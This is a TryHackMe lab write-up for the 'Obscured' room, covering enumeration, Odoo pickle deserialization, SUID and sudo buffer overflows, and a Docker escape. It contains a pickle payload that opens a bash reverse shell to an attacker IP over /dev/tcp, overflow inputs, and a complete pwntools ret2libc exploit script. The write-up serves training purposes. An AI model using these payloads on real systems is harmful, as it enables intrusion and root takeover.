---
tags:
  - THM
  - Linux
  - Medium
  - File-Analysis
  - Deserialization
  - RCE
  - Docker
  - SUID
  - BOF
  - Sudo
---
https://tryhackme.com/room/obscured/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.67.155.92 obscure.thm
```
# Scanning
```console
$ nmap -p21,22,80 -sV -sC obscure.thm

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.135.162
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:91:5c:43:c1:81:19:6e:0a:28:e8:16:78:c6:d5:c0 (RSA)
|   256 db:f8:7e:ca:5e:24:31:f9:07:57:8b:8d:74:cb:fe:c1 (ECDSA)
|_  256 40:6e:c3:a8:fb:df:15:d1:2b:9c:0f:c5:60:ba:e0:b6 (ED25519)
80/tcp open  http    Python BaseHTTPServer http.server 2 or 3.0 - 3.1
|_http-server-header: Werkzeug/0.9.6 Python/2.7.9
| http-cookie-flags: 
|   /: 
|     session_id: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
## FTP
Found a files with anonymous login:
```console
$ ftp anonymous@obscure.thm
Password:

ftp> ls
drwxr-xr-x    2 65534    65534        4096 Jul 24  2022 pub

ftp> cd pub

ftp> ls
-rw-r--r--    1 0        0             134 Jul 24  2022 notice.txt
-rwxr-xr-x    1 0        0            8856 Jul 22  2022 password

ftp> mget *

ftp> quit
```
According to `notice.txt`, the binary has a **password**:
```text
From antisoft.thm security,


A number of people have been forgetting their passwords so we've made a temporary password application.
```
Found the **password**:
```console
$ chmod +x password

$ strings password
...
[]A\A]A^A_
971234596
remember this next time '%s'
Incorrect employee id
Password Recovery
Please enter your employee id that is in your email
;*3$"
...

$ ./password
Password Recovery
Please enter your employee id that is in your email
971234596
remember this next time 'SecurePassword123!'
```
## Web Backup
The website is powered by [Odoo](https://www.odoo.com/), it requires login with **email** and **password**.

It allows us to download a **database** without login at `/web/database/manager`. So, we get an **email** from it:
```console
$ mv main_2026-01-06_22-34-32.zip db.zip

$ 7z x -odb db.zip

$ cd db/

$ grep '\.thm' dump.sql
3	Administrator	1	\N	\N	\N	2022-07-23 10:51:25.449364	0	t	\N	\N	Administrator	\N	\N	\N	\N	\N	\N	f	\N	admin@antisoft.thm	f	\N	en_US	\N	\N	\N	f	2022-07-23 10:52:10.087949	\N	\N	1	f	1	\N	\N	\N	contact	f	\N	\N	3
1	t	admin@antisoft.thm		1	3	\N	f	1	\N	\N	2022-07-23 10:52:10.087949	<span data-o-mail-quote="1">-- <br data-o-mail-quote="1">\nAdministrator</span>	$pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
```
The previous **hash** was not crackable, but we successfully login with **credentials**: `admin@antisoft.thm:SecurePassword123!`.
# Exploitation
Using `searchsploit`, found an [exploit](https://www.exploit-db.com/exploits/44064) for Odoo. So, create `gen.py`:
```python
import cPickle
import os
import base64
import pickletools

class Exploit(object):
	def __reduce__(self):
			    return (os.system, (("/bin/bash -c 'bash -i >& /dev/tcp/192.168.129.52/4444 0>&1'"),))

with open("exploit.pickle", "wb") as f:
	cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```
Generate the `exploit.pickle` file, then wait for connections:
```console
$ python2 gen.py

$ nc -lvnp 4444
```
Finally, follow the instructions of the exploit to upload the serialized payload and get the reverse shell connection and the **initial flag**:
```console
$ cat /var/lib/odoo/flag.txt
```
# Post-Exploitation
## Owning Docker
We are **user odoo** inside a Docker container. Found a rare **SUID executable** at `/ret`:
```console
$ find / -perm -4000 2>/dev/null

/bin/mount
/bin/umount
/bin/ping
/bin/ping6
/bin/su
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/ret
```
The binary is vulnerable to **buffer overflow**:
```console
$ /ret
Exploit this binary to get on the box!
What do you have for me?
INPUT

$ /ret
Exploit this binary to get on the box!
What do you have for me?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
Analyzed the file using `ghidra`. The program has basically 3 functions:
1. `main()` which calls for `vuln()` and ends the execution.
2. `vuln()` which outputs texts and gets input via `gets()`.
3. `win()` which spawns a `/bin/sh` shell.

So, we should just overflow `vuln()` to point towards `win()` and get code execution as **root**.

The `vuln()` function ends with a `ret`, which we know is equal to:
```nasm
RIP = [RSP]
RSP = RSP + 8
```
So, we need to modify the `RSP` to control the flow. First, we start by getting the offset:
```console
$ pwn checksec --file ret
[*] '/home/omar/HTB/Obscure/exploits/Overflow/ret'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

$ gdb ./ret

gef> pattern create 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

gef> run
Exploit this binary to get on the box!
What do you have for me?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

gef> x $rsp
0x7fffffffdaa8:	0x61616172

gef> pattern offset $rsp
[+] Searching for '7261616161616161'/'6161616161616172' with period=8
[+] Found at offset 136 (little-endian search) likely
```
Now, we find the address of `win()`:
```console
gef> print win
$1 = {<text variable, no debug info>} 0x400646 <win>

gef> quit
```
Now, create a Python script `buffer.py` to create a `payload.bin`:
```python
#!/usr/bin/python3
from pwn import *

payload = b'A'*136 + p64(0x400646)

with open('payload.bin', 'wb') as f:
    f.write(payload)
```
Copy its contents:
```console
$ cat payload.bin | wl-copy
```
Then, get **root shell**, found **fake flag**:
```console
$ /ret
Exploit this binary to get on the box!
What do you have for me?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF^F@^@^@^@^@^@

# cat /root/root.txt
Well done,my friend, you rooted a docker container.
```
## Escaping Container
The container has `nmap`, so by scanning the target machine (`172.17.0.1`), found a new open port (4444), which seems to run the same service we exploited:
```console
# nc 172.17.0.1 4444

Exploit this binary to get on the box!
What do you have for me?
```
So, we just send the same payload:
```console
# nc 172.17.0.1 4444

Exploit this binary to get on the box!
What do you have for me?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF^F@^@^@^@^@^@
id
uid=1000(zeeshan) gid=1000(zeeshan) groups=1000(zeeshan),27(sudo)
```
Create a stable connection by stealing SSH private key, then re-connect and get the **user flag**:
```console
$ cat /home/zeeshan/user.txt
```
## Privilege Escalation
We can run a suspicious binary with `sudo`, which is also vulnerable to buffer overflow:
```console
$ sudo -l
Matching Defaults entries for zeeshan on hydra:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zeeshan may run the following commands on hydra:
    (ALL : ALL) ALL
    (root) NOPASSWD: /exploit_me


$ sudo /exploit_me
Exploit this binary for root!
INPUT

$ sudo /exploit_me
Exploit this binary for root!
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
Transfer the file and the libc library to the local machine, the binary has enabled stack execution protection:
```console
$ pwn checksec --file ./exploit_me

    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
Radare2 shows this source code:
```c
/* r2dec pseudo code output (r2 5.9.8) */
/* ./exploit_me @ 0x4005b6 */
#include <stdint.h>
 
int32_t main (void) {
    char * s;
    edi = 0;
    eax = 0;
    setuid (edi);
    puts ("Exploit this binary for root!");
    rax = rbp - 0x20;
    eax = 0;
    gets (rax);
    eax = 0;
    return rax;
}
```
Using the same methodology of before, found the offset of `rsp` at 40. However, we can not go to a `win()` function and memory randomization is enabled:
```console
$ cat /proc/sys/kernel/randomize_va_space

2
```
So, we create a Python script `exploit.py` to exploit it:
```python
#!/usr/bin/python3

from pwn import *

# Local copies
FILE_LIBC = './libc-2.23.so'
FILE_EXEC = './exploit_me'
OFFSET = 40

# Binary context
libc = ELF(FILE_LIBC, False)
binary = context.binary = ELF(FILE_EXEC, False)
# context.log_level = 'debug'

# Run remotely
s = ssh('zeeshan', 'obscure.thm', keyfile='./zeeshan')
p = s.system('sudo /exploit_me')

# Gadgets
pop_rdi = ROP(binary).find_gadget(['pop rdi', 'ret'])[0]
ret = ROP(binary).find_gadget(['ret'])[0]

# Get libc address
payload = flat([
    asm('nop') * OFFSET,
    pop_rdi,
    binary.got['puts'],
    binary.plt['puts'],
    binary.symbols['main']
])
p.sendlineafter(b'!\n', payload)
libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - libc.symbols['puts']

# Execute system('/bin/sh')
payload = flat([
    asm('nop') * OFFSET,
    pop_rdi,
    next(libc.search(b'/bin/sh\x00')),
    ret,
    libc.symbols['system']
])
p.sendlineafter(b'!\n', payload)
p.interactive()
```
Get the reverse shell and get the **root flag**:
```console
$ python3 exploit.py

# cat /root/root.txt
```